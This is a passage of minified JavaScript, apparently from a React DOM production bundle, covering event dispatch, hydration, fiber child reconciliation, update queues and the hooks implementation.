k(d,u+"enter",w,t,p),k.target=f,k.relatedTarget=z,g=k),z=g,S&&w)n:{for(k=S,d=w,u=0,f=k;f;f=Ln(f))u++;for(f=0,g=d;g;g=Ln(g))f++;for(;0<u-f;)k=Ln(k),u--;for(;0<f-u;)d=Ln(d),f--;for(;u--;){if(k===d||d!==null&&k===d.alternate)break n;k=Ln(k),d=Ln(d)}k=null}else k=null;S!==null&&ds(h,m,S,k,!1),w!==null&&z!==null&&ds(h,z,w,k,!0)}}e:{if(m=c?Un(c):window,S=m.nodeName&&m.nodeName.toLowerCase(),S==="select"||S==="input"&&m.type==="file")var T=Id;else if(rs(m))if(Va)T=Hd;else{T=zd;var P=Ad}else(S=m.nodeName)&&S.toLowerCase()==="input"&&(m.type==="checkbox"||m.type==="radio")&&(T=Fd);if(T&&(T=T(e,c))){Ua(h,T,t,p);break e}P&&P(e,m,c),e==="focusout"&&(P=m._wrapperState)&&P.controlled&&m.type==="number"&&tl(m,"number",m.value)}switch(P=c?Un(c):window,e){case"focusin":(rs(P)||P.contentEditable==="true")&&(Fn=P,ml=c,jt=null);break;case"focusout":jt=ml=Fn=null;break;case"mousedown":hl=!0;break;case"contextmenu":case"mouseup":case"dragend":hl=!1,as(h,t,p);break;case"selectionchange":if(Bd)break;case"keydown":case"keyup":as(h,t,p)}var E;if(li)e:{switch(e){case"compositionstart":var j="onCompositionStart";break e;case"compositionend":j="onCompositionEnd";break e;case"compositionupdate":j="onCompositionUpdate";break e}j=void 0}else zn?Fa(e,t)&&(j="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(j="onCompositionStart");j&&(za&&t.locale!=="ko"&&(zn||j!=="onCompositionStart"?j==="onCompositionEnd"&&zn&&(E=Aa()):(nn=p,ti="value"in nn?nn.value:nn.textContent,zn=!0)),P=Fr(c,j),0<P.length&&(j=new qi(j,e,null,t,p),h.push({event:j,listeners:P}),E?j.data=E:(E=Ha(t),E!==null&&(j.data=E)))),(E=Md?Od(e,t):Dd(e,t))&&(c=Fr(c,"onBeforeInput"),0<c.length&&(p=new qi("onBeforeInput","beforeinput",null,t,p),h.push({event:p,listeners:c}),p.data=E))}Ya(h,n)})}function Vt(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Fr(e,n){for(var t=n+"Capture",r=[];e!==null;){var o=e,l=o.stateNode;o.tag===5&&l!==null&&(o=l,l=_t(e,t),l!=null&&r.unshift(Vt(e,l,o)),l=_t(e,n),l!=null&&r.push(Vt(e,l,o))),e=e.return}return r}function Ln(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function ds(e,n,t,r,o){for(var l=n._reactName,i=[];t!==null&&t!==r;){var s=t,a=s.alternate,c=s.stateNode;if(a!==null&&a===r)break;s.tag===5&&c!==null&&(s=c,o?(a=_t(t,l),a!=null&&i.unshift(Vt(t,a,s))):o||(a=_t(t,l),a!=null&&i.push(Vt(t,a,s)))),t=t.return}i.length!==0&&e.push({event:n,listeners:i})}var Kd=/\r\n?/g,Qd=/\u0000|\uFFFD/g;function fs(e){return(typeof e=="string"?e:""+e).replace(Kd,`
`).replace(Qd,"")}function fr(e,n,t){if(n=fs(n),fs(e)!==n&&t)throw Error(v(425))}function Hr(){}var gl=null,vl=null;function yl(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Sl=typeof setTimeout=="function"?setTimeout:void 0,Gd=typeof clearTimeout=="function"?clearTimeout:void 0,ps=typeof Promise=="function"?Promise:void 0,Xd=typeof queueMicrotask=="function"?queueMicrotask:typeof ps<"u"?function(e){return ps.resolve(null).then(e).catch(bd)}:Sl;function bd(e){setTimeout(function(){throw e})}function Fo(e,n){var t=n,r=0;do{var o=t.nextSibling;if(e.removeChild(t),o&&o.nodeType===8)if(t=o.data,t==="/$"){if(r===0){e.removeChild(o),zt(n);return}r--}else t!=="$"&&t!=="$?"&&t!=="$!"||r++;t=o}while(t);zt(n)}function sn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function ms(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var at=Math.random().toString(36).slice(2),ze="__reactFiber$"+at,Bt="__reactProps$"+at,Ke="__reactContainer$"+at,wl="__reactEvents$"+at,Yd="__reactListeners$"+at,Zd="__reactHandles$"+at;function kn(e){var n=e[ze];if(n)return n;for(var t=e.parentNode;t;){if(n=t[Ke]||t[ze]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=ms(e);e!==null;){if(t=e[ze])return t;e=ms(e)}return n}e=t,t=e.parentNode}return null}function Zt(e){return e=e[ze]||e[Ke],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Un(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(v(33))}function so(e){return e[Bt]||null}var kl=[],Vn=-1;function hn(e){return{current:e}}function A(e){0>Vn||(e.current=kl[Vn],kl[Vn]=null,Vn--)}function _(e,n){Vn++,kl[Vn]=e.current,e.current=n}var pn={},oe=hn(pn),de=hn(!1),En=pn;function et(e,n){var t=e.type.contextTypes;if(!t)return pn;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===n)return r.__reactInternalMemoizedMaskedChildContext;var o={},l;for(l in t)o[l]=n[l];return r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=o),o}function fe(e){return e=e.childContextTypes,e!=null}function Ur(){A(de),A(oe)}function hs(e,n,t){if(oe.current!==pn)throw Error(v(168));_(oe,n),_(de,t)}function qa(e,n,t){var r=e.stateNode;if(n=n.childContextTypes,typeof r.getChildContext!="function")return t;r=r.getChildContext();for(var o in r)if(!(o in n))throw Error(v(108,Ac(e)||"Unknown",o));return V({},t,r)}function Vr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||pn,En=oe.current,_(oe,e),_(de,de.current),!0}function gs(e,n,t){var r=e.stateNode;if(!r)throw Error(v(169));t?(e=qa(e,n,En),r.__reactInternalMemoizedMergedChildContext=e,A(de),A(oe),_(oe,e)):A(de),_(de,t)}var Ve=null,ao=!1,Ho=!1;function eu(e){Ve===null?Ve=[e]:Ve.push(e)}function qd(e){ao=!0,eu(e)}function gn(){if(!Ho&&Ve!==null){Ho=!0;var e=0,n=L;try{var t=Ve;for(L=1;e<t.length;e++){var r=t[e];do r=r(!0);while(r!==null)}Ve=null,ao=!1}catch(o){throw Ve!==null&&(Ve=Ve.slice(e+1)),Pa(Zl,gn),o}finally{L=n,Ho=!1}}return null}var Bn=[],Wn=0,Br=null,Wr=0,we=[],ke=0,jn=null,Be=1,We="";function Sn(e,n){Bn[Wn++]=Wr,Bn[Wn++]=Br,Br=e,Wr=n}function nu(e,n,t){we[ke++]=Be,we[ke++]=We,we[ke++]=jn,jn=e;var r=Be;e=We;var o=32-De(r)-1;r&=~(1<<o),t+=1;var l=32-De(n)+o;if(30<l){var i=o-o%5;l=(r&(1<<i)-1).toString(32),r>>=i,o-=i,Be=1<<32-De(n)+o|t<<o|r,We=l+e}else Be=1<<l|t<<o|r,We=e}function si(e){e.return!==null&&(Sn(e,1),nu(e,1,0))}function ai(e){for(;e===Br;)Br=Bn[--Wn],Bn[Wn]=null,Wr=Bn[--Wn],Bn[Wn]=null;for(;e===jn;)jn=we[--ke],we[ke]=null,We=we[--ke],we[ke]=null,Be=we[--ke],we[ke]=null}var ge=null,he=null,F=!1,Me=null;function tu(e,n){var t=Ce(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function vs(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,ge=e,he=sn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,ge=e,he=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=jn!==null?{id:Be,overflow:We}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Ce(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,ge=e,he=null,!0):!1;default:return!1}}function Cl(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Tl(e){if(F){var n=he;if(n){var t=n;if(!vs(e,n)){if(Cl(e))throw Error(v(418));n=sn(t.nextSibling);var r=ge;n&&vs(e,n)?tu(r,t):(e.flags=e.flags&-4097|2,F=!1,ge=e)}}else{if(Cl(e))throw Error(v(418));e.flags=e.flags&-4097|2,F=!1,ge=e}}}function ys(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ge=e}function pr(e){if(e!==ge)return!1;if(!F)return ys(e),F=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!yl(e.type,e.memoizedProps)),n&&(n=he)){if(Cl(e))throw ru(),Error(v(418));for(;n;)tu(e,n),n=sn(n.nextSibling)}if(ys(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(v(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){he=sn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}he=null}}else he=ge?sn(e.stateNode.nextSibling):null;return!0}function ru(){for(var e=he;e;)e=sn(e.nextSibling)}function nt(){he=ge=null,F=!1}function ui(e){Me===null?Me=[e]:Me.push(e)}var ef=Xe.ReactCurrentBatchConfig;function gt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(v(309));var r=t.stateNode}if(!r)throw Error(v(147,e));var o=r,l=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===l?n.ref:(n=function(i){var s=o.refs;i===null?delete s[l]:s[l]=i},n._stringRef=l,n)}if(typeof e!="string")throw Error(v(284));if(!t._owner)throw Error(v(290,e))}return e}function mr(e,n){throw e=Object.prototype.toString.call(n),Error(v(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Ss(e){var n=e._init;return n(e._payload)}function ou(e){function n(d,u){if(e){var f=d.deletions;f===null?(d.deletions=[u],d.flags|=16):f.push(u)}}function t(d,u){if(!e)return null;for(;u!==null;)n(d,u),u=u.sibling;return null}function r(d,u){for(d=new Map;u!==null;)u.key!==null?d.set(u.key,u):d.set(u.index,u),u=u.sibling;return d}function o(d,u){return d=dn(d,u),d.index=0,d.sibling=null,d}function l(d,u,f){return d.index=f,e?(f=d.alternate,f!==null?(f=f.index,f<u?(d.flags|=2,u):f):(d.flags|=2,u)):(d.flags|=1048576,u)}function i(d){return e&&d.alternate===null&&(d.flags|=2),d}function s(d,u,f,g){return u===null||u.tag!==6?(u=Ko(f,d.mode,g),u.return=d,u):(u=o(u,f),u.return=d,u)}function a(d,u,f,g){var T=f.type;return T===An?p(d,u,f.props.children,g,f.key):u!==null&&(u.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Ye&&Ss(T)===u.type)?(g=o(u,f.props),g.ref=gt(d,u,f),g.return=d,g):(g=Mr(f.type,f.key,f.props,null,d.mode,g),g.ref=gt(d,u,f),g.return=d,g)}function c(d,u,f,g){return u===null||u.tag!==4||u.stateNode.containerInfo!==f.containerInfo||u.stateNode.implementation!==f.implementation?(u=Qo(f,d.mode,g),u.return=d,u):(u=o(u,f.children||[]),u.return=d,u)}function p(d,u,f,g,T){return u===null||u.tag!==7?(u=Pn(f,d.mode,g,T),u.return=d,u):(u=o(u,f),u.return=d,u)}function h(d,u,f){if(typeof u=="string"&&u!==""||typeof u=="number")return u=Ko(""+u,d.mode,f),u.return=d,u;if(typeof u=="object"&&u!==null){switch(u.$$typeof){case rr:return f=Mr(u.type,u.key,u.props,null,d.mode,f),f.ref=gt(d,null,u),f.return=d,f;case In:return u=Qo(u,d.mode,f),u.return=d,u;case Ye:var g=u._init;return h(d,g(u._payload),f)}if(wt(u)||dt(u))return u=Pn(u,d.mode,f,null),u.return=d,u;mr(d,u)}return null}function m(d,u,f,g){var T=u!==null?u.key:null;if(typeof f=="string"&&f!==""||typeof f=="number")return T!==null?null:s(d,u,""+f,g);if(typeof f=="object"&&f!==null){switch(f.$$typeof){case rr:return f.key===T?a(d,u,f,g):null;case In:return f.key===T?c(d,u,f,g):null;case Ye:return T=f._init,m(d,u,T(f._payload),g)}if(wt(f)||dt(f))return T!==null?null:p(d,u,f,g,null);mr(d,f)}return null}function S(d,u,f,g,T){if(typeof g=="string"&&g!==""||typeof g=="number")return d=d.get(f)||null,s(u,d,""+g,T);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case rr:return d=d.get(g.key===null?f:g.key)||null,a(u,d,g,T);case In:return d=d.get(g.key===null?f:g.key)||null,c(u,d,g,T);case Ye:var P=g._init;return S(d,u,f,P(g._payload),T)}if(wt(g)||dt(g))return d=d.get(f)||null,p(u,d,g,T,null);mr(u,g)}return null}function w(d,u,f,g){for(var T=null,P=null,E=u,j=u=0,W=null;E!==null&&j<f.length;j++){E.index>j?(W=E,E=null):W=E.sibling;var O=m(d,E,f[j],g);if(O===null){E===null&&(E=W);break}e&&E&&O.alternate===null&&n(d,E),u=l(O,u,j),P===null?T=O:P.sibling=O,P=O,E=W}if(j===f.length)return t(d,E),F&&Sn(d,j),T;if(E===null){for(;j<f.length;j++)E=h(d,f[j],g),E!==null&&(u=l(E,u,j),P===null?T=E:P.sibling=E,P=E);return F&&Sn(d,j),T}for(E=r(d,E);j<f.length;j++)W=S(E,d,j,f[j],g),W!==null&&(e&&W.alternate!==null&&E.delete(W.key===null?j:W.key),u=l(W,u,j),P===null?T=W:P.sibling=W,P=W);return e&&E.forEach(function(Ee){return n(d,Ee)}),F&&Sn(d,j),T}function k(d,u,f,g){var T=dt(f);if(typeof T!="function")throw Error(v(150));if(f=T.call(f),f==null)throw Error(v(151));for(var P=T=null,E=u,j=u=0,W=null,O=f.next();E!==null&&!O.done;j++,O=f.next()){E.index>j?(W=E,E=null):W=E.sibling;var Ee=m(d,E,O.value,g);if(Ee===null){E===null&&(E=W);break}e&&E&&Ee.alternate===null&&n(d,E),u=l(Ee,u,j),P===null?T=Ee:P.sibling=Ee,P=Ee,E=W}if(O.done)return t(d,E),F&&Sn(d,j),T;if(E===null){for(;!O.done;j++,O=f.next())O=h(d,O.value,g),O!==null&&(u=l(O,u,j),P===null?T=O:P.sibling=O,P=O);return F&&Sn(d,j),T}for(E=r(d,E);!O.done;j++,O=f.next())O=S(E,d,j,O.value,g),O!==null&&(e&&O.alternate!==null&&E.delete(O.key===null?j:O.key),u=l(O,u,j),P===null?T=O:P.sibling=O,P=O);return e&&E.forEach(function(ut){return n(d,ut)}),F&&Sn(d,j),T}function z(d,u,f,g){if(typeof f=="object"&&f!==null&&f.type===An&&f.key===null&&(f=f.props.children),typeof f=="object"&&f!==null){switch(f.$$typeof){case rr:e:{for(var T=f.key,P=u;P!==null;){if(P.key===T){if(T=f.type,T===An){if(P.tag===7){t(d,P.sibling),u=o(P,f.props.children),u.return=d,d=u;break e}}else if(P.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===Ye&&Ss(T)===P.type){t(d,P.sibling),u=o(P,f.props),u.ref=gt(d,P,f),u.return=d,d=u;break e}t(d,P);break}else n(d,P);P=P.sibling}f.type===An?(u=Pn(f.props.children,d.mode,g,f.key),u.return=d,d=u):(g=Mr(f.type,f.key,f.props,null,d.mode,g),g.ref=gt(d,u,f),g.return=d,d=g)}return i(d);case In:e:{for(P=f.key;u!==null;){if(u.key===P)if(u.tag===4&&u.stateNode.containerInfo===f.containerInfo&&u.stateNode.implementation===f.implementation){t(d,u.sibling),u=o(u,f.children||[]),u.return=d,d=u;break e}else{t(d,u);break}else n(d,u);u=u.sibling}u=Qo(f,d.mode,g),u.return=d,d=u}return i(d);case Ye:return P=f._init,z(d,u,P(f._payload),g)}if(wt(f))return w(d,u,f,g);if(dt(f))return k(d,u,f,g);mr(d,f)}return typeof f=="string"&&f!==""||typeof f=="number"?(f=""+f,u!==null&&u.tag===6?(t(d,u.sibling),u=o(u,f),u.return=d,d=u):(t(d,u),u=Ko(f,d.mode,g),u.return=d,d=u),i(d)):t(d,u)}return z}var tt=ou(!0),lu=ou(!1),Jr=hn(null),$r=null,Jn=null,ci=null;function di(){ci=Jn=$r=null}function fi(e){var n=Jr.current;A(Jr),e._currentValue=n}function xl(e,n,t){for(;e!==null;){var r=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,r!==null&&(r.childLanes|=n)):r!==null&&(r.childLanes&n)!==n&&(r.childLanes|=n),e===t)break;e=e.return}}function Yn(e,n){$r=e,ci=Jn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(ce=!0),e.firstContext=null)}function xe(e){var n=e._currentValue;if(ci!==e)if(e={context:e,memoizedValue:n,next:null},Jn===null){if($r===null)throw Error(v(308));Jn=e,$r.dependencies={lanes:0,firstContext:e}}else Jn=Jn.next=e;return n}var Cn=null;function pi(e){Cn===null?Cn=[e]:Cn.push(e)}function iu(e,n,t,r){var o=n.interleaved;return o===null?(t.next=t,pi(n)):(t.next=o.next,o.next=t),n.interleaved=t,Qe(e,r)}function Qe(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var Ze=!1;function mi(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function su(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Je(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function an(e,n,t){var r=e.updateQueue;if(r===null)return null;if(r=r.shared,D&2){var o=r.pending;return o===null?n.next=n:(n.next=o.next,o.next=n),r.pending=n,Qe(e,t)}return o=r.interleaved,o===null?(n.next=n,pi(r)):(n.next=o.next,o.next=n),r.interleaved=n,Qe(e,t)}function xr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var r=n.lanes;r&=e.pendingLanes,t|=r,n.lanes=t,ql(e,t)}}function ws(e,n){var t=e.updateQueue,r=e.alternate;if(r!==null&&(r=r.updateQueue,t===r)){var o=null,l=null;if(t=t.firstBaseUpdate,t!==null){do{var i={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};l===null?o=l=i:l=l.next=i,t=t.next}while(t!==null);l===null?o=l=n:l=l.next=n}else o=l=n;t={baseState:r.baseState,firstBaseUpdate:o,lastBaseUpdate:l,shared:r.shared,effects:r.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Kr(e,n,t,r){var o=e.updateQueue;Ze=!1;var l=o.firstBaseUpdate,i=o.lastBaseUpdate,s=o.shared.pending;if(s!==null){o.shared.pending=null;var a=s,c=a.next;a.next=null,i===null?l=c:i.next=c,i=a;var p=e.alternate;p!==null&&(p=p.updateQueue,s=p.lastBaseUpdate,s!==i&&(s===null?p.firstBaseUpdate=c:s.next=c,p.lastBaseUpdate=a))}if(l!==null){var h=o.baseState;i=0,p=c=a=null,s=l;do{var m=s.lane,S=s.eventTime;if((r&m)===m){p!==null&&(p=p.next={eventTime:S,lane:0,tag:s.tag,payload:s.payload,callback:s.callback,next:null});e:{var w=e,k=s;switch(m=n,S=t,k.tag){case 1:if(w=k.payload,typeof w=="function"){h=w.call(S,h,m);break e}h=w;break e;case 3:w.flags=w.flags&-65537|128;case 0:if(w=k.payload,m=typeof w=="function"?w.call(S,h,m):w,m==null)break e;h=V({},h,m);break e;case 2:Ze=!0}}s.callback!==null&&s.lane!==0&&(e.flags|=64,m=o.effects,m===null?o.effects=[s]:m.push(s))}else S={eventTime:S,lane:m,tag:s.tag,payload:s.payload,callback:s.callback,next:null},p===null?(c=p=S,a=h):p=p.next=S,i|=m;if(s=s.next,s===null){if(s=o.shared.pending,s===null)break;m=s,s=m.next,m.next=null,o.lastBaseUpdate=m,o.shared.pending=null}}while(!0);if(p===null&&(a=h),o.baseState=a,o.firstBaseUpdate=c,o.lastBaseUpdate=p,n=o.shared.interleaved,n!==null){o=n;do i|=o.lane,o=o.next;while(o!==n)}else l===null&&(o.shared.lanes=0);Nn|=i,e.lanes=i,e.memoizedState=h}}function ks(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var r=e[n],o=r.callback;if(o!==null){if(r.callback=null,r=t,typeof o!="function")throw Error(v(191,o));o.call(r)}}}var qt={},He=hn(qt),Wt=hn(qt),Jt=hn(qt);function Tn(e){if(e===qt)throw Error(v(174));return e}function hi(e,n){switch(_(Jt,n),_(Wt,e),_(He,qt),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:ol(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=ol(n,e)}A(He),_(He,n)}function rt(){A(He),A(Wt),A(Jt)}function au(e){Tn(Jt.current);var n=Tn(He.current),t=ol(n,e.type);n!==t&&(_(Wt,e),_(He,t))}function gi(e){Wt.current===e&&(A(He),A(Wt))}var H=hn(0);function Qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Uo=[];function vi(){for(var e=0;e<Uo.length;e++)Uo[e]._workInProgressVersionPrimary=null;Uo.length=0}var Pr=Xe.ReactCurrentDispatcher,Vo=Xe.ReactCurrentBatchConfig,Rn=0,U=null,Q=null,b=null,Gr=!1,Rt=!1,$t=0,nf=0;function ne(){throw Error(v(321))}function yi(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!_e(e[t],n[t]))return!1;return!0}function Si(e,n,t,r,o,l){if(Rn=l,U=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Pr.current=e===null||e.memoizedState===null?lf:sf,e=t(r,o),Rt){l=0;do{if(Rt=!1,$t=0,25<=l)throw Error(v(301));l+=1,b=Q=null,n.updateQueue=null,Pr.current=af,e=t(r,o)}while(Rt)}if(Pr.current=Xr,n=Q!==null&&Q.next!==null,Rn=0,b=Q=U=null,Gr=!1,n)throw Error(v(300));return e}function wi(){var e=$t!==0;return $t=0,e}function Ae(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return b===null?U.memoizedState=b=e:b=b.next=e,b}function Pe(){if(Q===null){var e=U.alternate;e=e!==null?e.memoizedState:null}else e=Q.next;var n=b===null?U.memoizedState:b.next;if(n!==null)b=n,Q=e;else{if(e===null)throw Error(v(310));Q=e,e={memoizedState:Q.memoizedState,baseState:Q.baseState,baseQueue:Q.baseQueue,queue:Q.queue,next:null},b===null?U.memoizedState=b=e:b=b.next=e}return b}function Kt(e,n){return typeof n=="function"?n(e):n}function Bo(e){var n=Pe(),t=n.queue;if(t===null)throw Error(v(311));t.lastRenderedReducer=e;var r=Q,o=r.baseQueue,l=t.pending;if(l!==null){if(o!==null){var i=o.next;o.next=l.next,l.next=i}r.baseQueue=o=l,t.pending=null}if(o!==null){l=o.next,r=r.baseState;var s=i=null,a=null,c=l;do{var p=c.lane;if((Rn&p)===p)a!==null&&(a=a.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),r=c.hasEagerState?c.eagerState:e(r,c.action);else{var h={lane:p,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};a===null?(s=a=h,i=r):a=a.next=h,U.lanes|=p,Nn|=p}c=c.next}while(c!==null&&c!==l);a===null?i=r:a.next=s,_e(r,n.memoizedState)||(ce=!0),n.memoizedState=r,n.baseState=i,n.baseQueue=a,t.lastRenderedState=r}if(e=t.interleaved,e!==null){o=e;do l=o.lane,U.lanes|=l,Nn|=l,o=o.next;while(o!==e)}else o===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Wo(e){var n=Pe(),t=n.queue;if(t===null)throw Error(v(311));t.lastRenderedReducer=e;var r=t.dispatch,o=t.pending,l=n.memoizedState;if(o!==null){t.pending=null;var i=o=o.next;do l=e(l,i.action),i=i.next;while(i!==o);_e(l,n.memoizedState)||(ce=!0),n.memoizedState=l,n.baseQueue===null&&(n.baseState=l),t.lastRenderedState=l}return[l,r]}function uu(){}function cu(e,n){var t=U,r=Pe(),o=n(),l=!_e(r.memoizedState,o);if(l&&(r.memoizedState=o,ce=!0),r=r.queue,ki(pu.bind(null,t,r,e),[e]),r.getSnapshot!==n||l||b!==null&&b.memoizedState.tag&1){if(t.flags|=2048,Qt(9,fu.bind(null,t,r,o,n),void 0,null),Y===null)throw Error(v(349));Rn&30||du(t,n,o)}return o}function du(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function fu(e,n,t,r){n.value=t,n.getSnapshot=r,mu(n)&&hu(e)}function pu(e,n,t){return t(function(){mu(n)&&hu(e)})}function mu(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!_e(e,t)}catch{return!0}}function hu(e){var n=Qe(e,1);n!==null&&Le(n,e,1,-1)}function Cs(e){var n=Ae();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Kt,lastRenderedState:e},n.queue=e,e=e.dispatch=of.bind(null,U,e),[n.memoizedState,e]}function Qt(e,n,t,r){return e={tag:e,create:n,destroy:t,deps:r,next:null},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(r=t.next,t.next=e,e.next=r,n.lastEffect=e)),e}function gu(){return Pe().memoizedState}function Er(e,n,t,r){var o=Ae();U.flags|=e,o.memoizedState=Qt(1|n,t,void 0,r===void 0?null:r)}function uo(e,n,t,r){var o=Pe();r=r===void 0?null:r;var l=void 0;if(Q!==null){var i=Q.memoizedState;if(l=i.destroy,r!==null&&yi(r,i.deps)){o.memoizedState=Qt(n,t,l,r);return}}U.flags|=e,o.memoizedState=Qt(1|n,t,l,r)}function Ts(e,n){return Er(8390656,8,e,n)}function ki(e,n){return uo(2048,8,e,n)}function vu(e,n){return uo(4,2,e,n)}function yu(e,n){return uo(4,4,e,n)}function Su(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function wu(e,n,t){return t=t!=null?t.concat([e]):null,uo(4,4,Su.bind(null,n,e),t)}function Ci(){}function ku(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&yi(n,r[1])?r[0]:(t.memoizedState=[e,n],e)}function Cu(e,n){var t=Pe();n=n===void 0?null:n;var r=t.memoizedState;return r!==null&&n!==null&&yi(n,r[1])?r[0]:(e=e(),t.memoizedState=[e,n],e)}function Tu(e,n,t){return Rn&21?(_e(t,n)||(t=Ra(),U.lanes|=t,Nn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,ce=!0),e.memoizedState=t)}function tf(e,n){var t=L;L=t!==0&&4>t?t:4,e(!0);var r=Vo.transition;Vo.transition={};try{e(!1),n()}finally{L=t,Vo.transition=r}}function xu(){return Pe().memoizedState}function rf(e,n,t){var r=cn(e);if(t={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null},Pu(e))Eu(n,t);else if(t=iu(e,n,t,r),t!==null){var o=ie();Le(t,e,r,o),ju(t,n,r)}}function of(e,n,t){var r=cn(e),o={lane:r,action:t,hasEagerState:!1,eagerState:null,next:null};if(Pu(e))Eu(n,o);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=n.lastRenderedReducer,l!==null))try{var i=n.lastRenderedState,s=l(i,t);if(o.hasEagerState=!0,o.eagerState=s,_e(s,i)){var a=n.interleaved;a===null?(o.next=o,pi(n)):(o.next=a.next,a.next=o),n.interleaved=o;return}}catch{}finally{}t=iu(e,n,o,r),t!==null&&(o=ie(),Le(t,e,r,o),ju(t,n,r))}}function Pu(e){var n=e.alternate;return e===U||n!==null&&n===U}function Eu(e,n){Rt=Gr=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function ju(e,n,t){if(t&4194240){var r=n.lanes;r&=e.pendingLanes,t|=r,n.lanes=t,ql(e,t)}}var 